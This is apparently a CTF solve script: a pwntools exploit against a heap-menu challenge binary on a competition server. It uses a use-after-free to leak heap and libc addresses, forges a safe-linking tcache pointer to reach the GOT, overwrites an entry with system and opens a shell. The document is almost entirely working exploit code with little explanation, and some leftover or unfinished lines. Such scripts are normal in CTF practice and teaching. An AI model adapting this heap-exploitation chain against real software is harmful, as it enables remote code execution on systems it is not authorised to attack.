#!/usr/bin/env python3
from pwn import *
import os

# Binary & libc yang sudah dipatch (libc 2.36 dari container)
exe = context.binary = ELF('chall', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.log_level = 'debug'
context.terminal = ['wt.exe','wsl.exe']
gdbscript = '''
tbreak main
continue
'''

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOT:
        return remote('chal1.fwectf.com',8010)
    else:
        return process([exe.path] + argv, *a, **kw)

# ---- menu helpers ----
def cmd(c):
    io.sendline(str(c).encode())

def add(i, sz, data):
    cmd(1)
    io.sendline(str(i).encode())
    io.sendline(str(sz).encode())
    # read(…, size) persis 'sz' byte
    # assert len(data) == sz, f"len(data)={len(data)} must equal sz={sz}"
    io.sendafter(b'Data: ', data)

def add_zero(i):
    # malloc(0) → tidak menulis apapun; aman untuk leak dari GOT
    cmd(1)
    io.sendlineafter(b'Index: ', str(i).encode())
    io.sendlineafter(b'Size: ', b'0')
    # Tidak ada prompt "Data:" untuk size 0

def delete(i):
    cmd(2)
    io.sendlineafter(b'Index: ', str(i).encode())

def edit(i, data):
    # edit selalu write 0x100
    # assert len(data) == 0x100
    cmd(3)
    io.sendlineafter(b'Index: ', str(i).encode())
    io.sendafter(b'Data: ', data)

def show(i):
    cmd(4)
    io.sendlineafter(b'Index: ', str(i).encode())
    # io.reecvuntil(b',')
    return io.recv()

def safe_link(heap_base, target):
    return (heap_base >> 12) ^ target


io = start()

add(0, 0x28, b'A' * 4)
add(1, 0x28, b'B' * 4)
delete(0)
leak = show(0)
# print(leak)
heap_base = u64(leak[:8]) << 12
log.info(f"Heap Base: {hex(heap_base)}")
delete(1)

for i in range(6):
    add(i, 0x28, b'A' * 4)

add(7, 0x440, b'B' * 4)
add(6, 0x28, b'A' * 4)

for i in range(7):
    delete(i)

local = 0x1d2cc0
remote = 0x203b20
delete(7)
leak1 = show(7)
libc.address = u64(leak1[:8]) - local
log.info(f"leak libc: {hex(libc.address)}")
# print(leak1)

free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']
log.info(f"system: {hex(system)}")


edit(5, p64(safe_link(heap_base+0x390,0x404000)))
# add(0,0x28,b'AAA')
add(0,0x28,b'AAA')
add(0,0x28,b'/bin/sh\x00')
add(1,0x28,p64(libc.sym.system)+p64(libc.sym.puts))
# delete(5)

io.interactive()
